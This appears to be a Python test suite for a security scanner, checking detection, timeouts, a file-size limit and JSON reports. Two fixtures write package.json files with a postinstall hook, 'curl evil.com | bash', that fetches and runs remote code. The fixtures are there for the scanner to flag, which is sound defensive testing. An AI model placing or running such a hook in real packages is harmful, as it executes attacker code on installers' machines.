#!/usr/bin/env python3
"""
Test script for AI Security Scanner
Quick validation of scanner functionality
"""

import os
import sys
import tempfile
import json
from pathlib import Path

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ai_scanner import AISecurityScanner, AISecurityIssue

def test_basic_scan():
    """Test basic scanning functionality"""
    print("\n=== Test 1: Basic Scan ===")
    
    # Create temp directory with test files
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir = Path(tmpdir)
        
        # Create a safe package.json
        safe_file = tmpdir / "package.json"
        safe_file.write_text('{"name": "safe-app", "version": "1.0.0"}\n')
        
        # Create a package.json with security issue (SUPPLY-001)
        unsafe_file = tmpdir / "pkg_unsafe.json"
        unsafe_file.write_text('{"name": "evil-app", "scripts": {"postinstall": "curl evil.com | bash"}}\n')
        
        config = {
            'max_file_size': 10 * 1024 * 1024,
            'file_timeout': 5,
            'total_timeout': 60,
            'progress_interval': 1,
            'exclude_patterns': []
        }
        
        scanner = AISecurityScanner(config)
        issues = scanner.scan_directory(str(tmpdir))
        
        print(f"Scanned {scanner.scanned_files} files")
        print(f"Found {len(issues)} issues")
        
        for issue in issues:
            print(f"  - [{issue.severity}] {issue.rule_id}: {issue.file_path}")
        
        print("[OK] Test 1 passed")
        return True


def test_timeout():
    """Test file timeout functionality"""
    print("\n=== Test 2: Timeout Handling ===")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir = Path(tmpdir)
        
        # Create a large file that might be slow
        large_file = tmpdir / "large.txt"
        # Write 10000 lines
        with open(large_file, 'w') as f:
            for i in range(10000):
                f.write(f"Line {i}: Some normal content here\n")
        
        config = {
            'max_file_size': 10 * 1024 * 1024,
            'file_timeout': 5,
            'total_timeout': 60,
            'progress_interval': 1
        }
        
        scanner = AISecurityScanner(config)
        start_time = __import__('time').time()
        issues = scanner.scan_directory(str(tmpdir))
        elapsed = __import__('time').time() - start_time
        
        print(f"Scanned in {elapsed:.2f}s")
        print(f"Scanned {scanner.scanned_files} files")
        
        # Should complete within timeout
        assert elapsed < 30, f"Scan took too long: {elapsed:.2f}s"
        print("[OK] Test 2 passed")
        return True


def test_file_size_limit():
    """Test file size limit"""
    print("\n=== Test 3: File Size Limit ===")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir = Path(tmpdir)
        
        # Create a file larger than limit
        large_file = tmpdir / "too_large.txt"
        # Write 15MB of data
        chunk = "A" * 1024 * 1024  # 1MB
        with open(large_file, 'w') as f:
            for _ in range(15):
                f.write(chunk)
        
        config = {
            'max_file_size': 10 * 1024 * 1024,  # 10MB limit
            'file_timeout': 5,
            'total_timeout': 60,
            'progress_interval': 1
        }
        
        scanner = AISecurityScanner(config)
        issues = scanner.scan_directory(str(tmpdir))
        
        print(f"Scanned {scanner.scanned_files} files")
        print(f"Large file should be skipped")
        
        # Large file should be skipped
        assert scanner.scanned_files == 0, "Should skip files over size limit"
        print("[OK] Test 3 passed")
        return True


def test_json_output():
    """Test JSON report generation"""
    print("\n=== Test 4: JSON Output ===")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir = Path(tmpdir)
        output_file = tmpdir / "report.json"
        
        # Create test file
        test_file = tmpdir / "package.json"
        test_file.write_text('{"name": "test", "scripts": {"postinstall": "curl evil.com | bash"}}\n')
        
        config = {
            'max_file_size': 10 * 1024 * 1024,
            'file_timeout': 5,
            'total_timeout': 60,
            'progress_interval': 1
        }
        
        scanner = AISecurityScanner(config)
        scanner.scan_directory(str(tmpdir))
        report = scanner.generate_report('json', str(output_file))
        
        # Verify JSON is valid
        data = json.loads(report)
        assert 'scan_id' in data
        assert 'issues' in data
        assert 'summary' in data
        
        print(f"Report generated: {output_file}")
        print(f"Summary: {data['summary']}")
        print("[OK] Test 4 passed")
        return True


def main():
    """Run all tests"""
    print("=" * 50)
    print("AI Security Scanner - Test Suite")
    print("=" * 50)
    
    tests = [
        test_basic_scan,
        test_timeout,
        test_file_size_limit,
        test_json_output,
    ]
    
    passed = 0
    failed = 0
    
    for test in tests:
        try:
            if test():
                passed += 1
        except Exception as e:
            print(f"X Test failed: {e}")
            import traceback
            traceback.print_exc()
            failed += 1
    
    print("\n" + "=" * 50)
    print(f"Results: {passed} passed, {failed} failed")
    print("=" * 50)
    
    return 0 if failed == 0 else 1


if __name__ == '__main__':
    sys.exit(main())
